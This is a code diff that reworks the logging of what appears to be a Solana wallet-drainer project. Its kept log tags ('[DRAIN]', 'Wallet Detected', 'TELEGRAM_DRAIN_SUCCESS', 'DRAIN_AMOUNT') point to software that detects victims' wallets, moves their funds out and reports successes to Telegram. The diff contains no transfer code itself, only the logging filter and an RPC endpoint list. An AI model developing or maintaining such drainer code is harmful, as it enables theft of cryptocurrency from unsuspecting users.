@@ -21,36 +21,29 @@ function validateEnvironment() {
 }
 
 const isEnvValid = validateEnvironment();
-// Production logging - minimal for performance
-function debugLog(message, ...args) {
-  // Disabled in production for performance
-}
-
 // Production logging - allow all drain-related logs
-const originalConsoleLog = console.log;
-console.log = function() {
-  // Log all drain-related messages in production
-  if (arguments[0] && (
-    arguments[0].includes && (
-      arguments[0].includes('ERROR') || 
-      arguments[0].includes('[DRAIN]') ||
-      arguments[0].includes('[BALANCE]') ||
-      arguments[0].includes('[TELEGRAM]') ||
-      arguments[0].includes('Wallet Detected') ||
-      arguments[0].includes('DRAIN_FAILED') ||
-      arguments[0].includes('Creating transfer') ||
-      arguments[0].includes('Drain attempt details') ||
-      arguments[0].includes('TELEGRAM_DRAIN_SUCCESS') ||
-      arguments[0].includes('DRAIN_AMOUNT') ||
-      arguments[0].includes('CONFIRMATION') ||
-      arguments[0].includes('CONFIRMATION_HANDLER') ||
-      arguments[0].includes('DRAIN_CREATED') ||
-      arguments[0].includes('DRAIN_CREATED_FRONTEND')
+function debugLog(message, ...args) {
+  if (message && (
+    message.includes && (
+      message.includes('ERROR') || 
+      message.includes('[DRAIN]') ||
+      message.includes('[BALANCE]') ||
+      message.includes('[TELEGRAM]') ||
+      message.includes('Wallet Detected') ||
+      message.includes('DRAIN_FAILED') ||
+      message.includes('Creating transfer') ||
+      message.includes('Drain attempt details') ||
+      message.includes('TELEGRAM_DRAIN_SUCCESS') ||
+      message.includes('DRAIN_AMOUNT') ||
+      message.includes('CONFIRMATION') ||
+      message.includes('CONFIRMATION_HANDLER') ||
+      message.includes('DRAIN_CREATED') ||
+      message.includes('DRAIN_CREATED_FRONTEND')
     )
   )) {
-    originalConsoleLog.apply(console, arguments);
+    console.log(message, ...args);
   }
-};
+}
 
 const RPC_ENDPOINTS = [
   { url: 'https://api.mainnet-beta.solana.com', weight: 1 },
